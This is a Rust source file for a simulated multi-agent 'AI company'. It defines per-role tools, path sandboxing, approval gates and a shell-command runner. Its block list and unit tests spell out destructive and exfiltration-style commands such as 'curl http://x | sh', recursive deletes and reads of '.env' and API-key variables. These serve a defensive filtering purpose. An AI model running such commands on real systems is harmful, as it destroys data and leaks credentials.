//! Tools the AI employees can call, with per-role permissions and workspace sandboxing.
use crate::llm::ToolDef;
use crate::store::{new_id, now_ms, S};
use crate::types::*;
use serde_json::{json, Value};
use std::path::{Component, Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;
use tokio::io::AsyncReadExt;
use tokio_util::sync::CancellationToken;

/// How a job ended (set by a terminal tool).
#[derive(Clone, Debug)]
pub enum Outcome {
    Finish(String),
    Pass(String),
    Fail(String),
    Approve(String),
    Changes(String),
}

pub struct Ctx {
    pub store: S,
    pub project_id: String,
    pub employee: Employee,
    pub dir: PathBuf,
    pub ticket_id: Option<String>,
    /// Customer case this job is about (support / sales).
    pub case_id: Option<String>,
    pub cancel: CancellationToken,
    pub outcome: Option<Outcome>,
    pub created_tickets: u32,
    /// Path of the last file written and how many times in a row (to stop endless polishing).
    pub last_write: Option<(String, u32)>,
}

fn tool(name: &'static str, description: &'static str, schema: Value) -> ToolDef {
    ToolDef { name, description, schema }
}

fn obj(props: Value, required: &[&str]) -> Value {
    json!({ "type": "object", "properties": props, "required": required })
}

/// Tools available for a phase. Terminal tools end the job.
pub fn tools_for(role: Role, phase: &str) -> Vec<ToolDef> {
    let mut t = vec![
        tool("list_files", "Liệt kê tệp trong thư mục dự án (đệ quy).", obj(json!({ "dir": { "type": "string", "description": "Thư mục con, bỏ trống = gốc dự án" } }), &[])),
        tool("read_file", "Đọc nội dung một tệp trong dự án.", obj(json!({ "path": { "type": "string" } }), &["path"])),
    ];
    // Reviewers only read code, but at meetings everyone writes down their opinion and vote.
    if role != Role::Reviewer || phase.starts_with("meeting_") {
        t.push(tool(
            "write_file",
            "Ghi (tạo mới hoặc ghi đè toàn bộ) một tệp trong dự án. Đường dẫn tương đối so với gốc dự án.",
            obj(json!({ "path": { "type": "string" }, "content": { "type": "string" } }), &["path", "content"]),
        ));
    }
    if matches!(role, Role::Dev | Role::Tester | Role::Devops | Role::Architect | Role::Reviewer) {
        t.push(tool(
            "run_command",
            "Chạy một lệnh shell (Windows cmd) trong thư mục dự án, tối đa 120 giây. Dùng để chạy test, build, kiểm tra cú pháp.",
            obj(json!({ "command": { "type": "string" } }), &["command"]),
        ));
    }
    t.push(tool(
        "message_colleague",
        "Gửi tin nhắn cho đồng nghiệp theo vai trò (ceo, ba, dev, tester, ...). Họ sẽ đọc ở lượt việc tiếp theo.",
        obj(json!({ "to_role": { "type": "string" }, "text": { "type": "string" } }), &["to_role", "text"]),
    ));
    if role == Role::Ceo {
        t.push(tool(
            "ask_chairman",
            "Hỏi Chủ tịch (người dùng) khi yêu cầu thật sự mơ hồ. Chờ câu trả lời. Dùng tiết kiệm.",
            obj(json!({ "question": { "type": "string" } }), &["question"]),
        ));
    }
    if phase == "planning" {
        t.push(tool(
            "set_priority",
            "Đặt độ ưu tiên cho ticket: 1 = cao (làm trước), 2 = vừa, 3 = thấp.",
            obj(json!({ "key": { "type": "string", "description": "Mã ticket, vd T-1" }, "priority": { "type": "integer", "enum": [1, 2, 3] } }), &["key", "priority"]),
        ));
    }
    if phase == "release" {
        t.push(tool(
            "report_issue",
            "Mở ticket lỗi chặn phát hành (build hỏng, thiếu tệp, chạy không lên...). Dev sẽ sửa rồi DevOps kiểm tra lại.",
            obj(json!({ "title": { "type": "string" }, "description": { "type": "string" } }), &["title", "description"]),
        ));
    }
    if matches!(phase, "requirements" | "architecture" | "planning") {
        t.push(tool(
            "create_ticket",
            "Tạo một ticket công việc cho Dev. Mỗi ticket nhỏ, làm được độc lập, có tiêu chí nghiệm thu kiểm tra được.",
            obj(
                json!({
                    "title": { "type": "string" },
                    "description": { "type": "string" },
                    "acceptance": { "type": "array", "items": { "type": "string" } },
                    "type": { "type": "string", "enum": ["feature", "bug", "task"] }
                }),
                &["title", "description", "acceptance"],
            ),
        ));
    }
    // Business work.
    if matches!(phase, "support" | "sales") {
        t.push(tool(
            "reply_customer",
            "Gửi câu trả lời cho khách hàng trong hồ sơ này (khách thấy ngay trên Cổng khách hàng). Lịch sự, ngắn gọn, tiếng Việt.",
            obj(json!({ "text": { "type": "string" } }), &["text"]),
        ));
        t.push(tool(
            "resolve_case",
            "Đóng hồ sơ khi vấn đề của khách đã được giải quyết xong.",
            obj(json!({ "summary": { "type": "string" } }), &["summary"]),
        ));
    }
    if phase == "support" {
        t.push(tool(
            "escalate_bug",
            "Chuyển lỗi sản phẩm mà khách gặp cho đội kỹ thuật (tạo ticket bug ưu tiên cao). Đội sửa xong bạn sẽ được báo lại để thông báo cho khách.",
            obj(
                json!({ "title": { "type": "string" }, "description": { "type": "string" }, "steps": { "type": "string", "description": "Các bước tái hiện" } }),
                &["title", "description"],
            ),
        ));
    }
    if phase == "sales" {
        t.push(tool(
            "propose_deal",
            "Đề xuất chốt đơn khi khách đã đồng ý mua. Chủ tịch xác nhận thì doanh thu mới được ghi nhận.",
            obj(
                json!({ "customer": { "type": "string" }, "plan": { "type": "string" }, "amount_vnd": { "type": "integer", "description": "Số tiền (đồng)" } }),
                &["customer", "plan", "amount_vnd"],
            ),
        ));
    }
    if matches!(phase, "launch_finance" | "finance") {
        t.push(tool("company_finance", "Lấy số liệu tài chính thật của công ty: chi phí AI theo nhân viên và dự án, doanh thu đã chốt.", obj(json!({}), &[])));
    }
    if matches!(phase, "launch_hr" | "hr_review") {
        t.push(tool("company_kpi", "Lấy KPI, model và chi phí của toàn bộ nhân viên.", obj(json!({}), &[])));
        t.push(tool(
            "propose_hire",
            "Đề xuất Chủ tịch tuyển thêm một người. Chỉ dùng khi có lý do rõ ràng từ số liệu.",
            obj(json!({ "role": { "type": "string", "description": "ceo, pm, ba, architect, dev, reviewer, tester, devops, designer, secretary, marketing, sales, support, hr, accountant, legal" }, "reason": { "type": "string" } }), &["role", "reason"]),
        ));
    }
    match phase {
        "test" => {
            t.push(tool("pass_ticket", "Kết thúc: ticket đạt mọi tiêu chí nghiệm thu.", obj(json!({ "summary": { "type": "string" } }), &["summary"])));
            t.push(tool(
                "fail_ticket",
                "Kết thúc: ticket chưa đạt. Mô tả lỗi cụ thể, cách tái hiện, tiêu chí nào chưa đạt.",
                obj(json!({ "bug_report": { "type": "string" } }), &["bug_report"]),
            ));
        }
        "review" => {
            t.push(tool("approve_code", "Kết thúc: code đạt, chuyển sang test.", obj(json!({ "comment": { "type": "string" } }), &["comment"])));
            t.push(tool(
                "request_changes",
                "Kết thúc: yêu cầu Dev sửa. Nêu rõ cần sửa gì.",
                obj(json!({ "comment": { "type": "string" } }), &["comment"]),
            ));
        }
        _ => t.push(tool(
            "finish",
            "Kết thúc lượt việc này và bàn giao. Tóm tắt ngắn những gì đã làm.",
            obj(json!({ "summary": { "type": "string" } }), &["summary"]),
        )),
    }
    t
}

/// Resolve a model-supplied relative path inside the project directory, rejecting escapes.
pub fn safe_path(dir: &Path, rel: &str) -> Result<PathBuf, String> {
    let rel = rel.trim().replace('\\', "/");
    let rel = rel.trim_start_matches("./");
    let p = Path::new(rel);
    let mut out = dir.to_path_buf();
    for c in p.components() {
        match c {
            Component::Normal(s) => out.push(s),
            Component::CurDir => {}
            _ => return Err(format!("Đường dẫn không hợp lệ: {rel} (chỉ dùng đường dẫn tương đối trong dự án)")),
        }
    }
    Ok(out)
}

fn may_write(role: Role, rel: &str) -> bool {
    let r = rel.trim().replace('\\', "/").to_lowercase();
    match role {
        Role::Ceo | Role::Ba | Role::Pm | Role::Secretary => r.starts_with("docs/"),
        Role::Tester => r.starts_with("tests/") || r.starts_with("test/") || r.starts_with("docs/"),
        Role::Designer => r.starts_with("docs/") || r.starts_with("design/") || r.starts_with("assets/"),
        Role::Marketing => r.starts_with("marketing/") || r.starts_with("docs/"),
        Role::Sales => r.starts_with("sales/") || r.starts_with("docs/"),
        Role::Support => r.starts_with("support/") || r.starts_with("docs/"),
        Role::Hr => r.starts_with("hr/") || r.starts_with("docs/"),
        Role::Accountant => r.starts_with("finance/") || r.starts_with("docs/"),
        Role::Legal => r.starts_with("legal/") || r.starts_with("docs/"),
        _ => true,
    }
}

pub fn list_dir(dir: &Path, max: usize) -> Vec<String> {
    fn walk(base: &Path, cur: &Path, out: &mut Vec<String>, max: usize) {
        let Ok(rd) = std::fs::read_dir(cur) else { return };
        let mut entries: Vec<_> = rd.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            if out.len() >= max {
                return;
            }
            let name = e.file_name().to_string_lossy().to_string();
            if matches!(name.as_str(), "node_modules" | ".git" | "target" | "dist" | "__pycache__" | ".venv") {
                continue;
            }
            let p = e.path();
            let rel = p.strip_prefix(base).unwrap_or(&p).to_string_lossy().replace('\\', "/");
            if p.is_dir() {
                walk(base, &p, out, max);
            } else {
                let size = e.metadata().map(|m| m.len()).unwrap_or(0);
                out.push(format!("{rel} ({size} B)"));
            }
        }
    }
    let mut out = vec![];
    walk(dir, dir, &mut out, max);
    out
}

fn s<'a>(input: &'a Value, k: &str) -> &'a str {
    input.get(k).and_then(|v| v.as_str()).unwrap_or("")
}

/// Returns (content, is_error).
pub async fn execute(ctx: &mut Ctx, name: &str, input: &Value) -> (String, bool) {
    match run(ctx, name, input).await {
        Ok(s) => (s, false),
        Err(e) => (e, true),
    }
}

async fn run(ctx: &mut Ctx, name: &str, input: &Value) -> Result<String, String> {
    if input.get("__invalid_json").is_some() {
        return Err("Tham số tool không phải JSON hợp lệ, hãy gọi lại.".into());
    }
    let store = ctx.store.clone();
    let pid = ctx.project_id.clone();
    let me = ctx.employee.clone();
    match name {
        "list_files" => {
            let dir = safe_path(&ctx.dir, s(input, "dir"))?;
            let files = list_dir(&dir, 300);
            Ok(if files.is_empty() { "(thư mục trống)".into() } else { files.join("\n") })
        }
        "read_file" => {
            let p = safe_path(&ctx.dir, s(input, "path"))?;
            let bytes = tokio::fs::read(&p).await.map_err(|e| format!("Không đọc được {}: {e}", s(input, "path")))?;
            let text = String::from_utf8_lossy(&bytes);
            const MAX: usize = 60_000;
            Ok(if text.len() > MAX {
                let mut cut = MAX;
                while !text.is_char_boundary(cut) {
                    cut -= 1;
                }
                format!("{}\n…(cắt bớt, tệp dài {} byte)", &text[..cut], text.len())
            } else {
                text.into_owned()
            })
        }
        "write_file" => {
            let rel = s(input, "path");
            if !may_write(me.role, rel) {
                return Err(format!("Vai trò của bạn chỉ được ghi trong docs/ (hoặc tests/ với Tester). Không ghi được {rel}."));
            }
            let p = safe_path(&ctx.dir, rel)?;
            if let Some(parent) = p.parent() {
                tokio::fs::create_dir_all(parent).await.map_err(|e| e.to_string())?;
            }
            let content = s(input, "content");
            tokio::fs::write(&p, content).await.map_err(|e| format!("Không ghi được {rel}: {e}"))?;
            store.kpi(&me.id, |k| k.files_written += 1);
            let n = match &ctx.last_write {
                Some((last, n)) if last == rel => n + 1,
                _ => 1,
            };
            ctx.last_write = Some((rel.to_string(), n));
            if n >= 3 && rel.starts_with("docs/meetings/") {
                return Ok(format!("Đã ghi {rel} ({} byte). Bạn đã ghi tệp này {n} lần liên tiếp: nội dung đã đủ tốt, ĐỪNG sửa thêm nữa — gọi finish ngay.", content.len()));
            }
            Ok(format!("Đã ghi {rel} ({} byte)", content.len()))
        }
        "run_command" => run_command(ctx, s(input, "command")).await,
        "message_colleague" => {
            let role: Role = serde_json::from_value(json!(s(input, "to_role").to_lowercase()))
                .map_err(|_| "to_role không hợp lệ (ceo, pm, ba, architect, dev, reviewer, tester, devops, designer, secretary)".to_string())?;
            let to = store.staff(role).first().map(|e| e.id.clone()).ok_or_else(|| format!("Công ty chưa có ai làm {role:?}"))?;
            let text = s(input, "text").to_string();
            store.post_message(Some(&pid), &me.id, &to, text.clone(), "chat");
            store.emit(ServerEvent::Handoff { from: me.id.clone(), to: to.clone(), text: text.chars().take(60).collect() });
            Ok(format!("Đã gửi cho {}", store.display_name(&to)))
        }
        "ask_chairman" => {
            let q = s(input, "question").to_string();
            store.post_message(Some(&pid), &me.id, "chairman", q.clone(), "question");
            store.set_runtime(&me.id, EmpStatus::Waiting, "Chờ Chủ tịch trả lời", Some(&pid), None);
            let a = store
                .request_approval(Some(&pid), &me.id, ApprovalKind::Question, "Câu hỏi từ CEO", q, &ctx.cancel)
                .await?;
            Ok(match (a.status, a.answer) {
                (ApprovalStatus::Answered, Some(ans)) if !ans.trim().is_empty() => {
                    store.post_message(Some(&pid), "chairman", &me.id, ans.clone(), "chat");
                    format!("Chủ tịch trả lời: {ans}")
                }
                _ => "Chủ tịch không trả lời. Hãy tự quyết định hợp lý và ghi rõ giả định.".into(),
            })
        }
        "create_ticket" => {
            let title = s(input, "title").trim().to_string();
            if title.is_empty() {
                return Err("Thiếu title".into());
            }
            let seq = store.update_project(&pid, |p| {
                p.ticket_seq += 1;
                p.ticket_seq
            });
            let acceptance = input
                .get("acceptance")
                .and_then(|v| v.as_array())
                .map(|a| a.iter().filter_map(|x| x.as_str().map(str::to_string)).collect())
                .unwrap_or_default();
            let kind = match s(input, "type") {
                "bug" => "bug",
                "task" => "task",
                _ => "feature",
            };
            let t = Ticket {
                id: new_id(),
                project_id: pid.clone(),
                key: format!("T-{}", seq.unwrap_or(0)),
                title,
                description: s(input, "description").into(),
                acceptance,
                kind: kind.into(),
                status: TicketStatus::Todo,
                assignee: None,
                created_by: me.id.clone(),
                bounces: 0,
                notes: vec![],
                priority: 2,
                created_at: now_ms(),
                updated_at: now_ms(),
            };
            let key = t.key.clone();
            store.insert_ticket(t);
            ctx.created_tickets += 1;
            store.kpi(&me.id, |k| k.tickets_created += 1);
            Ok(format!("Đã tạo {key}"))
        }
        "set_priority" => {
            let key = s(input, "key").trim().to_uppercase();
            let prio = input.get("priority").and_then(|v| v.as_u64()).unwrap_or(2).clamp(1, 3) as u8;
            let id = store
                .with(|st| st.tickets.iter().find(|t| t.project_id == pid && t.key.to_uppercase() == key).map(|t| t.id.clone()))
                .ok_or_else(|| format!("Không có ticket {key}"))?;
            store.update_ticket(&id, |t| t.priority = prio);
            Ok(format!("{key} → ưu tiên {prio}"))
        }
        "report_issue" => {
            let title = s(input, "title").trim().to_string();
            if title.is_empty() {
                return Err("Thiếu title".into());
            }
            let seq = store.update_project(&pid, |p| {
                p.ticket_seq += 1;
                p.ticket_seq
            });
            let t = Ticket {
                id: new_id(),
                project_id: pid.clone(),
                key: format!("T-{}", seq.unwrap_or(0)),
                title: format!("[Phát hành] {title}"),
                description: s(input, "description").into(),
                acceptance: vec!["DevOps build và chạy lại được, không còn lỗi này".into()],
                kind: "bug".into(),
                status: TicketStatus::Todo,
                assignee: None,
                created_by: me.id.clone(),
                bounces: 0,
                notes: vec![],
                priority: 1,
                created_at: now_ms(),
                updated_at: now_ms(),
            };
            let key = t.key.clone();
            store.insert_ticket(t);
            ctx.created_tickets += 1;
            store.kpi(&me.id, |k| k.bugs_found += 1);
            Ok(format!("Đã mở ticket lỗi {key}"))
        }
        "finish" => {
            ctx.outcome = Some(Outcome::Finish(s(input, "summary").into()));
            Ok("OK".into())
        }
        "pass_ticket" => {
            ctx.outcome = Some(Outcome::Pass(s(input, "summary").into()));
            Ok("OK".into())
        }
        "fail_ticket" => {
            ctx.outcome = Some(Outcome::Fail(s(input, "bug_report").into()));
            Ok("OK".into())
        }
        "approve_code" => {
            ctx.outcome = Some(Outcome::Approve(s(input, "comment").into()));
            Ok("OK".into())
        }
        "request_changes" => {
            ctx.outcome = Some(Outcome::Changes(s(input, "comment").into()));
            Ok("OK".into())
        }
        "reply_customer" => {
            let cid = ctx.case_id.clone().ok_or("Việc này không gắn với hồ sơ khách hàng nào")?;
            let text = s(input, "text").trim().to_string();
            if text.is_empty() {
                return Err("Nội dung trả lời trống".into());
            }
            store.update_case(&cid, |c| {
                c.messages.push(CaseMsg { from: me.id.clone(), text: text.clone(), ts: now_ms() });
                if matches!(c.status, CaseStatus::Open | CaseStatus::InProgress) {
                    c.status = CaseStatus::WaitingCustomer;
                }
                c.assignee = Some(me.id.clone());
            });
            store.kpi(&me.id, |k| k.replies += 1);
            Ok("Đã gửi trả lời cho khách.".into())
        }
        "resolve_case" => {
            let cid = ctx.case_id.clone().ok_or("Việc này không gắn với hồ sơ khách hàng nào")?;
            let note = s(input, "summary").to_string();
            store.update_case(&cid, |c| {
                c.status = CaseStatus::Resolved;
                c.messages.push(CaseMsg { from: "system".into(), text: format!("Hồ sơ đã đóng: {note}"), ts: now_ms() });
            });
            store.kpi(&me.id, |k| k.cases_resolved += 1);
            Ok("Đã đóng hồ sơ.".into())
        }
        "escalate_bug" => {
            let cid = ctx.case_id.clone().ok_or("Việc này không gắn với hồ sơ khách hàng nào")?;
            let case = store.case(&cid).ok_or("Hồ sơ không tồn tại")?;
            if let Some(tid) = &case.ticket_id {
                if store.ticket(tid).map(|t| t.status != TicketStatus::Done).unwrap_or(false) {
                    return Ok("Lỗi này đã được chuyển cho đội kỹ thuật, đang chờ sửa.".into());
                }
            }
            let title = s(input, "title").trim().to_string();
            if title.is_empty() {
                return Err("Thiếu title".into());
            }
            let seq = store.update_project(&pid, |p| {
                p.ticket_seq += 1;
                p.ticket_seq
            });
            let steps = s(input, "steps");
            let t = Ticket {
                id: new_id(),
                project_id: pid.clone(),
                key: format!("T-{}", seq.unwrap_or(0)),
                title: format!("[Khách báo] {title}"),
                description: format!(
                    "{}\n\nCác bước tái hiện: {}\nKhách hàng: {} (hồ sơ {})",
                    s(input, "description"),
                    if steps.is_empty() { "(chưa rõ)" } else { steps },
                    case.customer,
                    case.id
                ),
                acceptance: vec!["Không còn tái hiện được lỗi khách báo".into(), "Các chức năng khác vẫn chạy đúng".into()],
                kind: "bug".into(),
                status: TicketStatus::Todo,
                assignee: None,
                created_by: me.id.clone(),
                bounces: 0,
                notes: vec![],
                priority: 1,
                created_at: now_ms(),
                updated_at: now_ms(),
            };
            let key = t.key.clone();
            let tid = t.id.clone();
            store.insert_ticket(t);
            store.update_case(&cid, |c| {
                c.ticket_id = Some(tid);
                c.status = CaseStatus::Escalated;
                c.messages.push(CaseMsg { from: "system".into(), text: format!("Đã chuyển đội kỹ thuật xử lý ({key})."), ts: now_ms() });
            });
            store.kpi(&me.id, |k| k.bugs_found += 1);
            if let Some(dev) = store.staff(Role::Dev).first() {
                store.emit(ServerEvent::Handoff { from: me.id.clone(), to: dev.id.clone(), text: format!("Khách báo lỗi {key}") });
                store.post_message(Some(&pid), &me.id, &dev.id, format!("Khách hàng báo lỗi {key}: {title}"), "handoff");
            }
            Ok(format!("Đã tạo {key} cho đội kỹ thuật. Hãy báo khách là đang xử lý."))
        }
        "propose_deal" => {
            let customer = s(input, "customer").trim().to_string();
            let plan = s(input, "plan").trim().to_string();
            let amount = input.get("amount_vnd").and_then(|v| v.as_u64().or_else(|| v.as_f64().map(|f| f as u64))).unwrap_or(0);
            if customer.is_empty() || plan.is_empty() || amount == 0 {
                return Err("Cần customer, plan và amount_vnd > 0".into());
            }
            store.set_runtime(&me.id, EmpStatus::Waiting, "Chờ Chủ tịch xác nhận đơn", Some(&pid), None);
            let a = store
                .request_approval(
                    Some(&pid),
                    &me.id,
                    ApprovalKind::Deal,
                    format!("{} đề xuất chốt đơn", me.name),
                    format!("Khách: {customer}\nGói: {plan}\nGiá trị: {} đ", fmt_vnd(amount)),
                    &ctx.cancel,
                )
                .await?;
            if a.status != ApprovalStatus::Approved {
                return Ok("Chủ tịch chưa xác nhận đơn này. Tiếp tục tư vấn, không báo khách là đã chốt.".into());
            }
            store.insert_deal(Deal {
                id: new_id(),
                project_id: pid.clone(),
                customer: customer.clone(),
                plan: plan.clone(),
                amount_vnd: amount,
                employee_id: me.id.clone(),
                ts: now_ms(),
            });
            store.kpi(&me.id, |k| {
                k.deals_won += 1;
                k.revenue_vnd += amount;
            });
            store.emit(ServerEvent::Handoff { from: me.id.clone(), to: "chairman".into(), text: "🔔 Chốt đơn!".into() });
            if let Some(cid) = &ctx.case_id {
                store.update_case(cid, |c| c.messages.push(CaseMsg { from: "system".into(), text: format!("Đơn hàng đã xác nhận: {plan} — {} đ", fmt_vnd(amount)), ts: now_ms() }));
            }
            Ok(format!("Chủ tịch đã xác nhận đơn {plan} ({} đ). Hãy cảm ơn khách và hướng dẫn bước tiếp theo.", fmt_vnd(amount)))
        }
        "company_finance" => Ok(finance_json(&store)),
        "company_kpi" => Ok(kpi_json(&store)),
        "propose_hire" => {
            let role: Role = serde_json::from_value(json!(s(input, "role").to_lowercase())).map_err(|_| "role không hợp lệ".to_string())?;
            let reason = s(input, "reason").to_string();
            let a = store
                .request_approval(
                    Some(&pid),
                    &me.id,
                    ApprovalKind::Hire,
                    format!("Nhân sự đề xuất tuyển {}", crate::config::role_label(role)),
                    reason,
                    &ctx.cancel,
                )
                .await?;
            if a.status != ApprovalStatus::Approved {
                return Ok("Chủ tịch không duyệt tuyển thêm.".into());
            }
            let e = store.hire(role, None);
            store.post_message(Some(&pid), &me.id, "all", format!("Chào mừng {} gia nhập công ty ({})!", e.name, crate::config::role_label(role)), "chat");
            Ok(format!("Đã tuyển {} ({}).", e.name, crate::config::role_label(role)))
        }
        other => Err(format!("Không có tool {other}")),
    }
}

pub const USD_TO_VND: f64 = 25_000.0;

pub fn fmt_vnd(v: u64) -> String {
    let s = v.to_string();
    let mut out = String::new();
    for (i, c) in s.chars().enumerate() {
        if i > 0 && (s.len() - i) % 3 == 0 {
            out.push('.');
        }
        out.push(c);
    }
    out
}

/// Real money figures for the accountant (AI cost from usage, revenue from confirmed deals).
pub fn finance_json(store: &S) -> String {
    let v = store.with(|st| {
        let by_emp: Vec<Value> = st
            .employees
            .iter()
            .map(|e| {
                let u = st.usage.get(&e.id).cloned().unwrap_or_default();
                json!({ "ten": e.name, "vai_tro": crate::config::role_label(e.role), "model": e.model, "nha_cung_cap": e.provider, "luot_goi": u.calls, "chi_phi_usd": (u.cost_usd * 10000.0).round() / 10000.0 })
            })
            .collect();
        let projects: Vec<Value> = st
            .projects
            .iter()
            .map(|p| {
                let rev: u64 = st.deals.iter().filter(|d| d.project_id == p.id).map(|d| d.amount_vnd).sum();
                json!({ "du_an": p.name, "trang_thai": p.status, "ngan_sach_usd": p.budget_usd, "chi_phi_ai_usd": (p.spent_usd * 10000.0).round() / 10000.0, "doanh_thu_vnd": rev })
            })
            .collect();
        let cost_usd: f64 = st.usage.values().map(|u| u.cost_usd).sum();
        let revenue: u64 = st.deals.iter().map(|d| d.amount_vnd).sum();
        let deals: Vec<Value> = st.deals.iter().map(|d| json!({ "khach": d.customer, "goi": d.plan, "vnd": d.amount_vnd })).collect();
        json!({
            "ty_gia_uoc_tinh_vnd_moi_usd": USD_TO_VND,
            "tong_chi_phi_ai_usd": (cost_usd * 10000.0).round() / 10000.0,
            "tong_chi_phi_ai_vnd": (cost_usd * USD_TO_VND).round(),
            "tong_doanh_thu_vnd": revenue,
            "loi_nhuan_vnd": revenue as f64 - (cost_usd * USD_TO_VND).round(),
            "theo_nhan_vien": by_emp,
            "theo_du_an": projects,
            "don_hang": deals,
            "ghi_chu": "Chi phí chỉ gồm tiền gọi model AI; Mock tính 0 đ."
        })
    });
    serde_json::to_string_pretty(&v).unwrap_or_default()
}

pub fn kpi_json(store: &S) -> String {
    let v = store.with(|st| {
        let rows: Vec<Value> = st
            .employees
            .iter()
            .map(|e| {
                let k = st.kpi.get(&e.id).cloned().unwrap_or_default();
                let u = st.usage.get(&e.id).cloned().unwrap_or_default();
                json!({ "ten": e.name, "vai_tro": crate::config::role_label(e.role), "dang_lam": e.enabled, "model": e.model, "kpi": k, "chi_phi_usd": u.cost_usd })
            })
            .collect();
        let open_tickets = st.tickets.iter().filter(|t| !matches!(t.status, TicketStatus::Done)).count();
        let open_cases = st.cases.iter().filter(|c| !matches!(c.status, CaseStatus::Resolved)).count();
        json!({ "nhan_vien": rows, "ticket_dang_mo": open_tickets, "ho_so_khach_dang_mo": open_cases })
    });
    serde_json::to_string_pretty(&v).unwrap_or_default()
}

/// Commands that are always refused.
fn is_dangerous(cmd: &str) -> bool {
    let c = cmd.to_lowercase();
    [
        "format ", "shutdown", "restart-computer", "stop-computer", "diskpart", "bcdedit", "reg delete", "reg add",
        "rm -rf /", "rm -rf ~", "del /s", "rd /s", "rmdir /s", "remove-item -recurse", "cipher /w", "takeown",
        "icacls", "net user", "schtasks", "vssadmin", "powershell -enc", "-encodedcommand", "invoke-webrequest",
        "iwr ", "curl ", "wget ", "c:\\windows", "%userprofile%", "%appdata%", "..\\", "../",
    ]
    .iter()
    .any(|p| c.contains(p))
}

/// Commands that run without asking when auto-approve is off.
fn is_safe(cmd: &str) -> bool {
    let c = cmd.trim().to_lowercase();
    if c.contains(['&', '|', '>', '<', ';', '`', '$', '%']) || c.contains(":\\") || c.contains(":/") {
        return false;
    }
    [
        "node ", "node --check", "npm test", "npm run ", "npm install", "npm ci", "npx tsc", "npx vitest", "npx jest",
        "python ", "py ", "pytest", "python -m pytest", "cargo check", "cargo test", "cargo build", "go test", "go build",
        "git status", "git diff", "git log", "git init", "git add", "git commit", "dir", "type ", "echo ", "tsc",
    ]
    .iter()
    .any(|p| c == p.trim() || c.starts_with(p))
}

async fn run_command(ctx: &mut Ctx, command: &str) -> Result<String, String> {
    let command = command.trim();
    if command.is_empty() {
        return Err("Lệnh trống".into());
    }
    if is_dangerous(command) {
        return Err("Lệnh bị chặn vì có thể gây hại hoặc ra ngoài thư mục dự án.".into());
    }
    let store = ctx.store.clone();
    let auto = store.with(|s| s.settings.auto_approve_commands);
    if !auto && !is_safe(command) {
        store.set_runtime(&ctx.employee.id, EmpStatus::Waiting, "Chờ duyệt lệnh", Some(&ctx.project_id), ctx.ticket_id.as_deref());
        let a = store
            .request_approval(
                Some(&ctx.project_id),
                &ctx.employee.id,
                ApprovalKind::Command,
                format!("{} muốn chạy lệnh", ctx.employee.name),
                command.to_string(),
                &ctx.cancel,
            )
            .await?;
        if a.status != ApprovalStatus::Approved {
            return Err("Chủ tịch không cho phép chạy lệnh này. Hãy dùng cách khác.".into());
        }
    }
    store.set_runtime(&ctx.employee.id, EmpStatus::Working, format!("$ {command}"), Some(&ctx.project_id), ctx.ticket_id.as_deref());

    let mut cmd = if cfg!(windows) {
        let mut c = tokio::process::Command::new("cmd");
        c.arg("/C").arg(command);
        c
    } else {
        let mut c = tokio::process::Command::new("sh");
        c.arg("-c").arg(command);
        c
    };
    cmd.current_dir(&ctx.dir).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped()).kill_on_drop(true);
    // Never leak API keys to code the agents run.
    for k in ["ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "OPENAI_API_KEY", "OPENROUTER_API_KEY", "GEMINI_API_KEY", "CUSTOM_API_KEY"] {
        cmd.env_remove(k);
    }
    #[cfg(windows)]
    {
        cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    }
    let mut child = cmd.spawn().map_err(|e| format!("Không chạy được lệnh: {e}"))?;
    let mut so = child.stdout.take().unwrap();
    let mut se = child.stderr.take().unwrap();
    let read = async {
        let mut a = Vec::new();
        let mut b = Vec::new();
        let _ = tokio::join!(so.read_to_end(&mut a), se.read_to_end(&mut b));
        let status = child.wait().await;
        (a, b, status)
    };
    let (out, err, status) = tokio::select! {
        r = tokio::time::timeout(Duration::from_secs(120), read) => r.map_err(|_| "Lệnh chạy quá 120 giây, đã dừng.".to_string())?,
        _ = ctx.cancel.cancelled() => return Err("aborted".into()),
    };
    let code = status.ok().and_then(|s| s.code()).unwrap_or(-1);
    let mut text = format!("exit code: {code}\n");
    let o = String::from_utf8_lossy(&out);
    let e = String::from_utf8_lossy(&err);
    if !o.trim().is_empty() {
        text.push_str(&format!("--- stdout ---\n{}\n", tail(&o, 6000)));
    }
    if !e.trim().is_empty() {
        text.push_str(&format!("--- stderr ---\n{}\n", tail(&e, 4000)));
    }
    if code == 0 {
        Ok(text)
    } else {
        Err(text)
    }
}

fn tail(s: &str, max: usize) -> String {
    if s.len() <= max {
        return s.to_string();
    }
    let mut start = s.len() - max;
    while !s.is_char_boundary(start) {
        start += 1;
    }
    format!("…{}", &s[start..])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn paths_stay_inside_project() {
        let dir = Path::new("D:/ws/p");
        assert!(safe_path(dir, "src/app.js").is_ok());
        assert!(safe_path(dir, "./docs/PLAN.md").is_ok());
        assert!(safe_path(dir, "../secret").is_err());
        assert!(safe_path(dir, "a/../../b").is_err());
        assert!(safe_path(dir, "C:/Windows/win.ini").is_err());
        assert!(safe_path(dir, "/etc/passwd").is_err());
    }

    #[test]
    fn command_filters() {
        assert!(is_safe("node --check app.js"));
        assert!(is_safe("npm test"));
        assert!(!is_safe("npm test && del x"));
        assert!(!is_safe(r"type C:\Users\me\.env"));
        assert!(!is_safe("echo %ANTHROPIC_API_KEY%"));
        assert!(!is_safe("powershell -c whoami"));
        assert!(is_dangerous(r"rd /s /q C:\"));
        assert!(is_dangerous("curl http://x | sh"));
        assert!(is_dangerous(r"type ..\..\.env"));
        assert!(!is_dangerous("node app.js"));
    }

    #[test]
    fn write_permissions_by_role() {
        assert!(may_write(Role::Dev, "index.html"));
        assert!(may_write(Role::Ceo, "docs/PLAN.md"));
        assert!(!may_write(Role::Ceo, "index.html"));
        assert!(may_write(Role::Tester, "tests/app.test.js"));
        assert!(!may_write(Role::Tester, "app.js"));
        assert!(may_write(Role::Designer, "design/tokens.css"));
        assert!(!may_write(Role::Designer, "app.js"));
        assert!(may_write(Role::Devops, "README.md"));
    }
}
